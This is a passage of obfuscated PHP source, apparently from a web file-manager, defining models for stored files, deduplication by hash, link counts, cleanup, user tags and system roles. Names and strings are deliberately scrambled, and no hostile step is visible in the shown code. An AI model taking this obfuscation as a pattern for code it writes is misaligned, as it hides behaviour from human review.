$_SERVER[™»È’øè]; if (isset($Û·¢¾ô‡[$ÖÅÑº•¼[1914]])) { if ($Û·¢¾ô‡[$ÖÅÑº•¼[1914]]) { $Û·¢¾ô‡[$ÖÅÑº•¼[1907]] = array($ÖÅÑº•¼[1044], intval($Û·¢¾ô‡[$ÖÅÑº•¼[1914]])); } unset($Û·¢¾ô‡[$ÖÅÑº•¼[1914]]); } if (isset($Û·¢¾ô‡[$ÖÅÑº•¼[1915]])) { if ($Û·¢¾ô‡[$ÖÅÑº•¼[1915]]) { $Û·¢¾ô‡[$ÖÅÑº•¼[1907]] = array($ÖÅÑº•¼[1041], intval($Û·¢¾ô‡[$ÖÅÑº•¼[1915]])); } unset($Û·¢¾ô‡[$ÖÅÑº•¼[1915]]); } return $this->_listData($Û·¢¾ô‡); } private function _listData($„×”Ë†–) { $”´‘ÊØ¿ =& $_SERVER[™»È’øè]; $øÛà®¬Å = $this->where($„×”Ë†–)->_makeOrder()->selectPage(100); $this->_listAppendParent($øÛà®¬Å[$”´‘ÊØ¿[412]]); $this->_listAppendUser($øÛà®¬Å[$”´‘ÊØ¿[412]]); $this->_listAppendMeta($øÛà®¬Å[$”´‘ÊØ¿[412]]); return $øÛà®¬Å; } private function _makeOrder() { $Ÿëî›‡Æ =& $_SERVER[™»È’øè]; $çàÂ°ô = array($Ÿëî›‡Æ[1902], $Ÿëî›‡Æ[1901], $Ÿëî›‡Æ[214]); $‡ûóŞöá = Input::get($Ÿëî›‡Æ[497], $Ÿëî›‡Æ[7], $Ÿëî›‡Æ[464], $çàÂ°ô); $Ê¢‰şŸ = Input::get($Ÿëî›‡Æ[498], $Ÿëî›‡Æ[7], $Ÿëî›‡Æ[1671], array($Ÿëî›‡Æ[1916], $Ÿëî›‡Æ[493])); $‡ØŠĞ†Ø = $‡ûóŞöá . $Ÿëî›‡Æ[53] . $Ê¢‰şŸ; return $this->order($‡ØŠĞ†Ø); } private function _listAppendParent(&$‹õØ¸ƒ) { $éğ®İæĞ =& $_SERVER[™»È’øè]; $Ì¹¶Şßª = array_unique(array_to_keyvalue($‹õØ¸ƒ, $éğ®İæĞ[12], $éğ®İæĞ[1899])); $Ì¹¶Şßª = array_remove_value($Ì¹¶Şßª, $éğ®İæĞ[211]); if (!$Ì¹¶Şßª) { return; } $ò¦Ò²¶İ = $this->where(array($éğ®İæĞ[1900] => array($éğ®İæĞ[7], $Ì¹¶Şßª)))->select(); $ò¦Ò²¶İ = array_to_keyvalue($ò¦Ò²¶İ, $éğ®İæĞ[1907]); foreach ($‹õØ¸ƒ as &$¦µÑ‚·) { if (isset($ò¦Ò²¶İ[$¦µÑ‚·[$éğ®İæĞ[1899]]])) { $¦µÑ‚·[$éğ®İæĞ[1917]] = $ò¦Ò²¶İ[$¦µÑ‚·[$éğ®İæĞ[1899]]]; } } unset($¦µÑ‚·); } private function _listAppendUser(&$Ü ãã™â) { $ûç¨êšö =& $_SERVER[™»È’øè]; $‡¢¸ˆÎ = array_unique(array_to_keyvalue($Ü ãã™â, $ûç¨êšö[12], $ûç¨êšö[1678])); $‡¢¸ˆÎ = array_remove_value($‡¢¸ˆÎ, $ûç¨êšö[211]); if (count($‡¢¸ˆÎ) == 0) { return; } foreach ($Ü ãã™â as $µ²­À¶) { if (isset($µ²­À¶[$ûç¨êšö[1917]])) { $‡¢¸ˆÎ[] = $µ²­À¶[$ûç¨êšö[1917]][$ûç¨êšö[1678]]; } } $Ö õÀõ¥ = Model($ûç¨êšö[566])->userListInfo($‡¢¸ˆÎ); foreach ($Ü ãã™â as &$µ²­À¶) { $µ²­À¶[$ûç¨êšö[629]] = $Ö õÀõ¥[$µ²­À¶[$ûç¨êšö[1678]]]; if (isset($µ²­À¶[$ûç¨êšö[1917]])) { $µ²­À¶[$ûç¨êšö[1917]][$ûç¨êšö[629]] = $Ö õÀõ¥[$µ²­À¶[$ûç¨êšö[1917]][$ûç¨êšö[1678]]]; } } unset($µ²­À¶); } private function _listAppendMeta(&$ÆùêóÄâ) { $›Ç«•€é =& $_SERVER[™»È’øè]; $‚ƒ½ß‹å = array_unique(array_to_keyvalue($ÆùêóÄâ, $›Ç«•€é[12], $›Ç«•€é[1907])); $‚ƒ½ß‹å = array_remove_value($‚ƒ½ß‹å, $›Ç«•€é[211]); if (!$‚ƒ½ß‹å) { return; } foreach ($ÆùêóÄâ as $ÑÎ€¡ÀŒ) { if (isset($ÑÎ€¡ÀŒ[$›Ç«•€é[1917]])) { $‚ƒ½ß‹å[] = $ÑÎ€¡ÀŒ[$›Ç«•€é[1917]][$›Ç«•€é[1907]]; } } $ë«³Û±ğ = $this->metaList($‚ƒ½ß‹å); if (!$ë«³Û±ğ) { return !1; } foreach ($ÆùêóÄâ as &$ÑÎ€¡ÀŒ) { $ÑÎ€¡ÀŒ[$›Ç«•€é[506]] = $ë«³Û±ğ[$ÑÎ€¡ÀŒ[$›Ç«•€é[1907]]]; if (isset($ÑÎ€¡ÀŒ[$›Ç«•€é[1917]])) { $ÑÎ€¡ÀŒ[$›Ç«•€é[1917]][$›Ç«•€é[506]] = $ë«³Û±ğ[$ÑÎ€¡ÀŒ[$›Ç«•€é[1917]][$›Ç«•€é[1907]]]; } } unset($ÑÎ€¡ÀŒ); } private function metaList($ÛÖñ¸ä ) { $üëÕàÚå =& $_SERVER[™»È’øè]; if (!$ÛÖñ¸ä ) { return array(); } $àÒÛûë = array($üëÕàÚå[1907] => array($üëÕàÚå[7], $ÛÖñ¸ä )); $ã¶õ˜òò = Model($üëÕàÚå[1918])->where($àÒÛûë)->select(); $ã¶õ˜òò = array_to_keyvalue_group($ã¶õ˜òò, $üëÕàÚå[1907]); foreach ($ã¶õ˜òò as $¤¾Ñë¡ó => $Æ®İñµº) { $õô‰ßÜ§ = array(); foreach ($Æ®İñµº as $©‰ÀÕ›) { $õô‰ßÜ§[$©‰ÀÕ›[$üëÕàÚå[94]]] = $©‰ÀÕ›[$üëÕàÚå[417]]; } $ã¶õ˜òò[$¤¾Ñë¡ó] = $õô‰ßÜ§; } return $ã¶õ˜òò ? $ã¶õ˜òò : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\157\137\x66\x69\154\x65\137\x63\157\156\164\x65\156\x74\x73"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\x65\124\151\x6d\145", "\x74\151\x6d\145", "\151\x6e\163\145\162\x74", "\146\165\156\x63\164\151\x6f\x6e")); } class FileModel extends ModelBase { protected $tableName = "\151\157\137\x66\x69\154\x65"; protected $tableMeta = array("\164\x61\142\x6c\145\116\x61\x6d\x65" => "\151\157\x5f\x66\151\154\x65\x5f\155\x65\x74\x61", "\x6d\145\x74\141\x46\x69\145\x6c\x64" => "\x66\151\154\145\111\104"); public function fileInfo($ãõÀˆ†Á) { $‚´±Ÿúè =& $_SERVER[™»È’øè]; static $®„Ù¤å  = array(); if (!isset($®„Ù¤å [$ãõÀˆ†Á])) { $­å‡˜… = $‚´±Ÿúè[1919]; $ŒÚŞË‘ = Model($‚´±Ÿúè[511])->field($­å‡˜…)->where(array($‚´±Ÿúè[509] => $ãõÀˆ†Á))->find(); $®„Ù¤å [$ãõÀˆ†Á] = $ŒÚŞË‘; } return $®„Ù¤å [$ãõÀˆ†Á]; } public function addFileByContent($‹Ÿ¦› = '', $¹ĞïÖ¢Â = '') { $¯²ğ¬Ì¦ =& $_SERVER[™»È’øè]; $Ÿ¤““Ü¥ = TEMP_PATH . $¯²ğ¬Ì¦[1920]; if (!is_dir($Ÿ¤““Ü¥)) { mk_dir($Ÿ¤““Ü¥); } $Ô§€äÖĞ = $Ÿ¤““Ü¥ . $¯²ğ¬Ì¦[1921] . rand_string(16); file_put_contents($Ô§€äÖĞ, $‹Ÿ¦›); $»ÁİĞ¦¥ = $this->addFile($Ô§€äÖĞ, $¹ĞïÖ¢Â, !0); if (file_exists($Ô§€äÖĞ)) { @unlink($Ô§€äÖĞ); } return $»ÁİĞ¦¥; } public function createFileName($¶ÆØÇ±—, $×å¤—Ë = false, $ùû“Ã„¡ = false) { $İ½­²úˆ =& $_SERVER[™»È’øè]; $¢§ÔÁé = IO::init($İ½­²úˆ[8]); $×ÎÊÅ®  = $this->makeFilePath($¶ÆØÇ±—, $¢§ÔÁé, $×å¤—Ë, $ùû“Ã„¡); $ê×Ş¦½‡ = $¢§ÔÁé->pathFather($×ÎÊÅ® ); static $”‹¨¡ó = false; $¸ÆÏúùê = $İ½­²úˆ[1922] . md5($ê×Ş¦½‡); if (!$”‹¨¡ó && !Cache::get($¸ÆÏúùê)) { $”‹¨¡ó = !0; $€•ºáó = IO::mkdir($ê×Ş¦½‡); if (!IO::exist($€•ºáó . $İ½­²úˆ[822])) { IO::mkfile($€•ºáó . $İ½­²úˆ[822]); } Cache::set($¸ÆÏúùê, 1, 3600 * 2); } return $×ÎÊÅ® ; } public function makeFilePath($”ˆççÆ, $ûÃÄæ¬É, $ãâÚ”æÙ = false, $¬×±ùøË = false) { $ØüÅ¼ëœ =& $_SERVER[™»È’øè]; $å£¥Ïíë = Model($ØüÅ¼ëœ[795])->get($ØüÅ¼ëœ[1923]); $Íß§ó¸Í = KodIO::defaultIO() . date($ØüÅ¼ëœ[1924]); $­ß˜Ñ‡ü = $Íß§ó¸Í . rand_string(5) . short_id(100); $”ˆççÆ = str_replace($ØüÅ¼ëœ[8], $ØüÅ¼ëœ[11], KodIO::clear($”ˆççÆ)); $çˆÄ—×¦ = $ûÃÄæ¬É->ext($”ˆççÆ); if (!$”ˆççÆ) { $å£¥Ïíë = $ØüÅ¼ëœ[1925]; } switch ($å£¥Ïíë) { case $ØüÅ¼ëœ[1926]: $­ß˜Ñ‡ü = $­ß˜Ñ‡ü . $ØüÅ¼ëœ[10] . $ûÃÄæ¬É->ext($”ˆççÆ); if ($çˆÄ—×¦ == $ØüÅ¼ëœ[1863]) { $­ß˜Ñ‡ü .= $ØüÅ¼ëœ[1236]; } break; case $ØüÅ¼ëœ[1927]: $Û†§•Æú = Model($ØüÅ¼ëœ[795])->get($ØüÅ¼ëœ[796]); $‹’ û« = substr(md5($ØüÅ¼ëœ[797] . $Û†§•Æú . date($ØüÅ¼ëœ[773])), 0, 8); $¤¹›…Ë“ = KodIO::defaultDriver(); $Íß§ó¸Í = $ØüÅ¼ëœ[1267] . $¤¹›…Ë“[$ØüÅ¼ëœ[442]] . $ØüÅ¼ëœ[451] . date($ØüÅ¼ëœ[1928]) . $‹’ û« . $ØüÅ¼ëœ[8]; if ($çˆÄ—×¦ == $ØüÅ¼ëœ[1863]) { $”ˆççÆ .= $ØüÅ¼ëœ[1236]; } $ã†—Ù³ = $ØüÅ¼ëœ[1929] . $Íß§ó¸Í . $”ˆççÆ; CacheLock::lock($ã†—Ù³); $­ß˜Ñ‡ü = $Íß§ó¸Í . $”ˆççÆ; if (IO::exist($Íß§ó¸Í . $”ˆççÆ)) { $™à‹›ŒÊ = substr($”ˆççÆ, 0, strlen($”ˆççÆ) - strlen($çˆÄ—×¦)); $…‡Ş™± = $¬×±ùøË ? substr($¬×±ùøË, 0, 5) : ($ãâÚ”æÙ ? substr($ãâÚ”æÙ, 0, 5) : rand_string(5)); $­ß˜Ñ‡ü = $Íß§ó¸Í . $™à‹›ŒÊ . $…‡Ş™± . $ØüÅ¼ëœ[10] . $çˆÄ—×¦; } if (IO::isTypeObject($­ß˜Ñ‡ü) && !IO::isUploadServer($­ß˜Ñ‡ü)) { if (IO::exist($­ß˜Ñ‡ü)) { return $­ß˜Ñ‡ü; } $´‹ĞÂÎ = IO::setContent($­ß˜Ñ‡ü, $ØüÅ¼ëœ[12]); if (!$´‹ĞÂÎ) { show_json($ØüÅ¼ëœ[1930], !1); } } CacheLock::unlock($ã†—Ù³); break; case $ØüÅ¼ëœ[1925]: break; default: break; } return $­ß˜Ñ‡ü; } public function addFileByRemote($ßÄ°å‡Õ, $òã°”Ë´, $… Øõ”´ = array()) { $½²äò«² =& $_SERVER[™»È’øè]; if (!IO::exist($ßÄ°å‡Õ)) { return !1; } $°ªÆ›ÃÄ = $… Øõ”´[$½²äò«²[640]] ? $… Øõ”´[$½²äò«²[640]] : $½²äò«²[12]; $£Ş­ôÏ = IO::hashMd5($ßÄ°å‡Õ, $°ªÆ›ÃÄ); $Òµèæªš = KodIO::defaultDriver(); $”ºãĞ™Ê = array($½²äò«²[584] => IO::size($ßÄ°å‡Õ), $½²äò«²[1931] => 1, $½²äò«²[461] => $òã°”Ë´, $½²äò«²[833] => $Òµèæªš[$½²äò«²[442]], $½²äò«²[462] => $ßÄ°å‡Õ, $½²äò«²[1932] => $… Øõ”´[$½²äò«²[639]] ? $… Øõ”´[$½²äò«²[639]] : IO::hashSimple($ßÄ°å‡Õ), $½²äò«²[1933] => $£Ş­ôÏ ? $£Ş­ôÏ : $°ªÆ›ÃÄ); if ($¿¬Ú£Ğ• = $this->addFileCheckExist($”ºãĞ™Ê[$½²äò«²[639]], $”ºãĞ™Ê[$½²äò«²[640]], $”ºãĞ™Ê[$½²äò«²[76]])) { return $¿¬Ú£Ğ•; } return $this->addFileData($”ºãĞ™Ê); } private function addFileData($û» ›ñ±) { $äÖÁ¨™ =& $_SERVER[™»È’øè]; if (!$û» ›ñ±) { return !1; } $û» ›ñ±[$äÖÁ¨™[76]] = intval($û» ›ñ±[$äÖÁ¨™[76]]); if (!$û» ›ñ±[$äÖÁ¨™[76]] && strlen($û» ›ñ±[$äÖÁ¨™[639]]) > 32) { $û» ›ñ±[$äÖÁ¨™[76]] = intval(substr($û» ›ñ±[$äÖÁ¨™[639]], 32)); } $ Ä†ü¡à = $this->add($û» ›ñ±); return $this->find($ Ä†ü¡à); } public function addFile($¦¦öÀ, $àŞ„¶ÅŸ, $’á­ÏÙ” = false) { $Âíµ¢×ú =& $_SERVER[™»È’øè]; $¿ßË†Ö“ = IO::hashSimple($¦¦öÀ); $óŒ‘°¸ù = IO::size($¦¦öÀ); $†¯Â¿ÔÍ = $óŒ‘°¸ù <= 1024 * 1024 * 10 ? IO::hashMd5($¦¦öÀ) : $Âíµ¢×ú[12]; $¯¢æ´³ä = $Âíµ¢×ú[1934] . $¿ßË†Ö“; CacheLock::lock($¯¢æ´³ä); if ($†¯Â¿ÔÍ && $¿ßË†Ö“) { $ôœ’Íœ¨ = $this->addFileCheckExist($¿ßË†Ö“, $†¯Â¿ÔÍ, $óŒ‘°¸ù); if ($ôœ’Íœ¨) { CacheLock::unlock($¯¢æ´³ä); return $ôœ’Íœ¨; } } $…ô°˜ßë = $this->addFileMake($¦¦öÀ, $óŒ‘°¸ù, $¿ßË†Ö“, $†¯Â¿ÔÍ, $àŞ„¶ÅŸ, $’á­ÏÙ”); $¢ß Û‡© = $this->addFileData($…ô°˜ßë); CacheLock::unlock($¯¢æ´³ä); if (!$†¯Â¿ÔÍ && $¢ß Û‡©) { $this->fileMd5Check($¢ß Û‡©); } return $¢ß Û‡©; } private function fileMd5Check($Õ¦ÓÄ˜·) { $ÖÔæÖÒØ =& $_SERVER[™»È’øè]; $¹µ¿áâ = array($Õ¦ÓÄ˜·[$ÖÔæÖÒØ[508]], $Õ¦ÓÄ˜·[$ÖÔæÖÒØ[84]]); $è¼€İŞù = $ÖÔæÖÒØ[1935] . $Õ¦ÓÄ˜·[$ÖÔæÖÒØ[84]]; $çü¼çõ = $ÖÔæÖÒØ[1936] . $Õ¦ÓÄ˜·[$ÖÔæÖÒØ[508]]; $¾ä¸şòÚ = TaskQueue::add($ÖÔæÖÒØ[1937], $¹µ¿áâ, $è¼€İŞù, $çü¼çõ); if (!$¾ä¸şòÚ) { $this->fileMd5Set($Õ¦ÓÄ˜·[$ÖÔæÖÒØ[508]], $Õ¦ÓÄ˜·[$ÖÔæÖÒØ[84]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($„Ã¢¯ôû, $…â‰Øâ) { $ÜÍ¢Ø¨ş =& $_SERVER[™»È’øè]; $ÌÇ×ü­ = $this->find($„Ã¢¯ôû); if (!$ÌÇ×ü­ || $ÌÇ×ü­[$ÜÍ¢Ø¨ş[640]]) { return; } $¶‹âÓ—š = IO::hashMd5($…â‰Øâ); if (!$¶‹âÓ—š) { return $ÜÍ¢Ø¨ş[12]; } $this->where(array($ÜÍ¢Ø¨ş[508] => $„Ã¢¯ôû))->save(array($ÜÍ¢Ø¨ş[640] => $¶‹âÓ—š)); } public function addFileMake($×‘ó›˜, $ŞïÄœ©©, $†í ÙÎø, $İÙï’ùÔ, $íöõ—Ô, $ƒ‚ßÄÕ) { $ÓÏÃüŸÚ =& $_SERVER[™»È’øè]; $«¾‰ğ¨ğ = $this->createFileName($íöõ—Ô, $†í ÙÎø, $İÙï’ùÔ); $¦êè¯ù‚ = get_path_father($«¾‰ğ¨ğ); $Êö’îô« = get_path_this($«¾‰ğ¨ğ); if ($ƒ‚ßÄÕ) { $ê×Î… = IO::move($×‘ó›˜, $¦êè¯ù‚, !1, $Êö’îô«); } else { $ê×Î… = IO::copy($×‘ó›˜, $¦êè¯ù‚, !1, $Êö’îô«); } if (!$ê×Î…) { return !1; } $‡²ùÏë = KodIO::defaultDriver(); $å¦²¨Æ = array($ÓÏÃüŸÚ[584] => $ŞïÄœ©©, $ÓÏÃüŸÚ[1931] => 1, $ÓÏÃüŸÚ[461] => $íöõ—Ô, $ÓÏÃüŸÚ[833] => $‡²ùÏë[$ÓÏÃüŸÚ[442]], $ÓÏÃüŸÚ[462] => $«¾‰ğ¨ğ, $ÓÏÃüŸÚ[1932] => $†í ÙÎø, $ÓÏÃüŸÚ[1933] => $İÙï’ùÔ); return $å¦²¨Æ; } public function addFileCheckExist($Çü©¶¤Ú, $ËÏ¿ş”, $¸»›é¹) { $ÉæÓ¯¤ü =& $_SERVER[™»È’øè]; $Ğ›ÊÓÁò = $this->findByHash($Çü©¶¤Ú, $ËÏ¿ş”); if (!$Ğ›ÊÓÁò) { return !1; } $æà“€Ö = array($ÉæÓ¯¤ü[1931] => intval($Ğ›ÊÓÁò[$ÉæÓ¯¤ü[1938]]) + 1, $ÉæÓ¯¤ü[584] => $¸»›é¹); $this->where(array($ÉæÓ¯¤ü[509] => $Ğ›ÊÓÁò[$ÉæÓ¯¤ü[508]]))->save($æà“€Ö); return $Ğ›ÊÓÁò; } public function remove($Ÿ²Ã•Ş¦) { $this->linkCountChange($Ÿ²Ã•Ş¦, !1); $this->clearEmpty(); return !0; } public function linkAdd($¬½Öş’¦) { $this->linkCountChange($¬½Öş’¦, !0); } public function linkCountChange($½¶­µÄÄ, $ÆÂõÖ®©) { $‰è½Úâ¯ =& $_SERVER[™»È’øè]; if (!$½¶­µÄÄ) { return; } if (!is_array($½¶­µÄÄ)) { $½¶­µÄÄ = array($½¶­µÄÄ); } $õ¶©™ë = array(); foreach ($½¶­µÄÄ as $ö¹Âóå) { $Åêã·ªç = $ö¹Âóå . $‰è½Úâ¯[12]; if (!$õ¶©™ë[$Åêã·ªç]) { $õ¶©™ë[$Åêã·ªç] = 0; } $õ¶©™ë[$Åêã·ªç]++; } $¹¼ó¥‰ë = array(); foreach ($õ¶©™ë as $ö¹Âóå => $ÎÄ’âËî) { $Åêã·ªç = $ÎÄ’âËî . $‰è½Úâ¯[12]; if (!$¹¼ó¥‰ë[$Åêã·ªç]) { $¹¼ó¥‰ë[$Åêã·ªç] = array(); } $¹¼ó¥‰ë[$Åêã·ªç][] = $ö¹Âóå; } foreach ($¹¼ó¥‰ë as $ÎÄ’âËî => $Ü…µÇ®) { if (!$Ü…µÇ®) { continue; } $ÎÄ’âËî = $ÆÂõÖ®© ? $ÎÄ’âËî : -intval($ÎÄ’âËî); $è®ÍŠê´ = array($‰è½Úâ¯[508] => array($‰è½Úâ¯[7], $Ü…µÇ®)); if ($ÎÄ’âËî < 0) { $è®ÍŠê´[$‰è½Úâ¯[1938]] = array($‰è½Úâ¯[1045], abs($ÎÄ’âËî)); } $this->where($è®ÍŠê´)->setAdd($‰è½Úâ¯[1938], $ÎÄ’âËî); } } public function findByHash($úÌÎãò, $ÊÄÏ…à¹ = false) { $û¯šê¿‰ =& $_SERVER[™»È’øè]; if (!$úÌÎãò && !$ÊÄÏ…à¹) { return !1; } $ü‡§ş¡ = array($û¯šê¿‰[1932] => $úÌÎãò); if ($ÊÄÏ…à¹) { $ü‡§ş¡ = array($û¯šê¿‰[1933] => $ÊÄÏ…à¹); } return $this->order($û¯šê¿‰[1939])->where($ü‡§ş¡)->find(); } public function clearEmpty($úÊØ«Á¸ = 0) { $¹Á´ğ€ê =& $_SERVER[™»È’øè]; $ü£œÜĞ = time() - 3600 * 24 * $úÊØ«Á¸; $í†ûì  = $¹Á´ğ€ê[1940] . $ü£œÜĞ; $Ç İ¢…Ó = $this->where($í†ûì )->select(); if (!$Ç İ¢…Ó) { return; } $çÅ¢†İ = new Task($¹Á´ğ€ê[1941], $¹Á´ğ€ê[12], count($Ç İ¢…Ó)); foreach ($Ç İ¢…Ó as $—•Ë‹ğğ) { $çÅ¢†İ->update(1); $this->resetFile($—•Ë‹ğğ); } $çÅ¢†İ->end(); } public function resetFile($ë›¤´’•) { $õı©ëÉ‘ =& $_SERVER[™»È’øè]; $Ş’ìóÅ‘ = array($õı©ëÉ‘[509] => $ë›¤´’•[$õı©ëÉ‘[508]]); $ÜÏÈ³çô = Model($õı©ëÉ‘[1362])->where($Ş’ìóÅ‘)->count(); $‹Ó­¶ÂÏ = Model($õı©ëÉ‘[1942])->where($Ş’ìóÅ‘)->count(); $¡’”Ô“© = intval($ÜÏÈ³çô) + intval($‹Ó­¶ÂÏ); if ($¡’”Ô“© == 0) { IO::remove($ë›¤´’•[$õı©ëÉ‘[84]]); Model($õı©ëÉ‘[1943])->delete($ë›¤´’•[$õı©ëÉ‘[508]]); $this->where($Ş’ìóÅ‘)->delete(); $this->metaSet($ë›¤´’•[$õı©ëÉ‘[508]], null, null); return; } if ($ë›¤´’•[$õı©ëÉ‘[1938]] != $¡’”Ô“©) { $this->where($Ş’ìóÅ‘)->save(array($õı©ëÉ‘[1931] => $¡’”Ô“©)); } } public function storageInfo($“Ö±å³¿ = false) { $©ùˆ˜¶¹ =& $_SERVER[™»È’øè]; $¾Œõó£ = $this->count() + 0.0; $ÙéÉƒ–‡ = 0; $ííğÏ‚İ = 1; $îÉÃàÉ = 0; $“®Â¤Ñ» = 5000; for ($Ù·¾¬— = 0; $Ù·¾¬— < $¾Œõó£; $Ù·¾¬— = $Ù·¾¬— + $“®Â¤Ñ») { $Ê²ôƒú = $this->limit($Ù·¾¬—, $Ù·¾¬— + $“®Â¤Ñ»)->select(); foreach ($Ê²ôƒú as $ï¦°İ) { $ííğÏ‚İ += $ï¦°İ[$©ùˆ˜¶¹[76]] * $ï¦°İ[$©ùˆ˜¶¹[1938]]; $ÙéÉƒ–‡ += $ï¦°İ[$©ùˆ˜¶¹[76]] * ($ï¦°İ[$©ùˆ˜¶¹[1938]] - 1); $îÉÃàÉ += $ï¦°İ[$©ùˆ˜¶¹[1938]]; } } $õûŸã¶Â = array($©ùˆ˜¶¹[1944] => $ííğÏ‚İ, $©ùˆ˜¶¹[1945] => $ÙéÉƒ–‡, $©ùˆ˜¶¹[1946] => $ÙéÉƒ–‡ / $ííğÏ‚İ, $©ùˆ˜¶¹[80] => $¾Œõó£, $©ùˆ˜¶¹[1947] => $îÉÃàÉ); return $õûŸã¶Â; } } goto AäÈĞ¶ä½¦; C‘­ò†Ë“: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\145\x72\x5f\157\x70\164\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($ÄûÙÈƒ¬) { $©ÀáÁÓğ =& $_SERVER[™»È’øè]; $¾øí°Ô = defined($©ÀáÁÓğ[2091]) && USER_ID ? USER_ID : $©ÀáÁÓğ[12]; return "\125\163\145\162\x4f\160\x74\151\157\x6e\x5f{$ÄûÙÈƒ¬}\137" . $¾øí°Ô; } protected function filterWhere($‡µŠ¹§ç) { $šßÂèè =& $_SERVER[™»È’øè]; $‡µŠ¹§ç[$šßÂèè[1678]] = defined($šßÂèè[2091]) && USER_ID ? USER_ID : $šßÂèè[12]; return $‡µŠ¹§ç; } public function cacheRemoveUser($ó¬ÓşÓª, $ß•Ÿø€¦) { return Cache::remove("\125\x73\x65\x72\117\x70\164\x69\x6f\156\137{$ó¬ÓşÓª}\137" . $ß•Ÿø€¦); } protected function optionDefault($÷Ù®…¶ = '') { $ÎôˆÁ =& $_SERVER[™»È’øè]; if ($÷Ù®…¶ == $ÎôˆÁ[12]) { return $GLOBALS[$ÎôˆÁ[6]][$ÎôˆÁ[2367]]; } if ($÷Ù®…¶ == $ÎôˆÁ[2368]) { return $GLOBALS[$ÎôˆÁ[6]][$ÎôˆÁ[2369]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\x65\162\56\164\141\147\x4c\151\163\164"; public $modelType = "\125\x73\x65\x72\x4f\160\164\151\x6f\156"; public $field = array("\x6e\141\x6d\145", "\163\164\x79\x6c\x65", "\163\157\162\x74"); public function listData($¼¥ŸÏÛ‡ = false, $û¥²å” = "\x73\x6f\x72\164", $ƒÏ¨”ø³ = false) { return parent::listData($¼¥ŸÏÛ‡, $û¥²å”, $ƒÏ¨”ø³); } public function remove($îÒ­ò²õ) { return parent::remove($îÒ­ò²õ); } public function add($ËçÑËË¦, $ÇõÔºªì = "\x6c\141\142\145\x6c\x2d\147\x72\x65\x79\55\x6e\157\x72\x6d\x61\x6c") { $ìÍáˆƒ÷ =& $_SERVER[™»È’øè]; if ($this->findByName($ËçÑËË¦)) { return !1; } $£ŸÎ’ÙÊ = array($ìÍáˆƒ÷[461] => $ËçÑËË¦, $ìÍáˆƒ÷[525] => $ÇõÔºªì, $ìÍáˆƒ÷[1874] => $this->getSort($ìÍáˆƒ÷[301]) + 1); return parent::insert($£ŸÎ’ÙÊ); } public function update($†€°Ÿåš, $ƒ€Ä‹çÕ) { $Şæõ—Ëï =& $_SERVER[™»È’øè]; $Î¼ÒËÊ = $this->listData($†€°Ÿåš); $ùœà©Òó = $this->findByName($ƒ€Ä‹çÕ[$Şæõ—Ëï[32]]); if (!$Î¼ÒËÊ || $ùœà©Òó && $ùœà©Òó[$Şæõ—Ëï[442]] != $Î¼ÒËÊ[$Şæõ—Ëï[442]]) { return !1; } return parent::update($†€°Ÿåš, $ƒ€Ä‹çÕ); } public function moveTop($é‹¬„ù) { $ï¯‘×“ =& $_SERVER[™»È’øè]; $ä¦áĞ¤Ë = parent::listData(); $± ºÊö = $this->getSort($ï¯‘×“[300]); foreach ($ä¦áĞ¤Ë as &$‡±ª¤ï¶) { if ($‡±ª¤ï¶[$ï¯‘×“[442]] == $é‹¬„ù) { $‡±ª¤ï¶[$ï¯‘×“[1894]] = $± ºÊö; continue; } $‡±ª¤ï¶[$ï¯‘×“[1894]] += 1; } unset($‡±ª¤ï¶); return parent::resetData($ä¦áĞ¤Ë); } public function moveBottom($Ü˜”Î±¯) { $­—›ã¯å =& $_SERVER[™»È’øè]; $Áõ‚Úñ = $this->getSort($­—›ã¯å[301]) + 1; return parent::update($Ü˜”Î±¯, array($­—›ã¯å[1894] => $Áõ‚Úñ)); } public function resetSort($ÏÂÆ¸¡§) { $§ØúÜè± =& $_SERVER[™»È’øè]; $ƒ´Ä‰Òõ = array(); $ÏÂÆ¸¡§ = is_array($ÏÂÆ¸¡§) ? $ÏÂÆ¸¡§ : array(); for ($€ãğºÑ³ = 0; $€ãğºÑ³ < count($ÏÂÆ¸¡§); $€ãğºÑ³++) { $ƒ´Ä‰Òõ[$ÏÂÆ¸¡§[$€ãğºÑ³] . $§ØúÜè±[12]] = $€ãğºÑ³ + 1; } $¬¡—ïÅÍ = parent::listData(); foreach ($¬¡—ïÅÍ as &$Á…†ÚÙ±) { $º´ÑöÅù = $ƒ´Ä‰Òõ[$Á…†ÚÙ±[$§ØúÜè±[442]]]; $Á…†ÚÙ±[$§ØúÜè±[1894]] = $º´ÑöÅù ? $º´ÑöÅù : $Á…†ÚÙ±[$§ØúÜè±[1894]]; } unset($Á…†ÚÙ±); return parent::resetData($¬¡—ïÅÍ); } private function getSort($ÉïÛ¾’õ) { $ùç¾è«ô =& $_SERVER[™»È’øè]; $ù±íã¿ = parent::listData(); $î´¼¢ = array_to_keyvalue($ù±íã¿, $ùç¾è«ô[12], $ùç¾è«ô[1894]); if (!$î´¼¢) { $î´¼¢ = array(0); } $£ÃÄÂÄ¥ = $ÉïÛ¾’õ == $ùç¾è«ô[301] ? max($î´¼¢) : min($î´¼¢); return intval($£ÃÄÂÄ¥); } } goto dßâ¦Õ´; CÊ•ÆÃ¤Ø: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\x6d\x2e\x72\x6f\154\x65\114\151\163\x74"; public $field = array("\156\x61\x6d\145", "\x61\165\164\150", "\x6c\141\142\x65\154", "\144\x69\x73\x70\x6c\x61\171", "\163\171\163\x74\x65\155", "\x64\145\163\143", "\x69\x67\156\x6f\162\x65\105\170\x74", "\151\x67\x6e\x6f\162\145\106\x69\x6c\145\x53\x69\172\145", "\141\x64\x6d\x69\156\151\x73\164\162\x61\164\157\162", "\163\x6f\162\x74"); public function listData($ÊÕÛ¯ƒ¶ = false, $ËïçÈú‹ = "\x73\x6f\x72\x74", $­Èßşæ = false) { $º˜Òà·Ğ =& $_SERVER[™»È’øè]; $˜¨åÃËø = parent::listData($ÊÕÛ¯ƒ¶, $ËïçÈú‹, $­Èßşæ); if (!$ÊÕÛ¯ƒ¶) { foreach ($˜¨åÃËø as $¸Í‹Ãğ– => $ÃÃ¢ºæ») { if ($ÃÃ¢ºæ»[$º˜Òà·Ğ[2072]] == 1) { 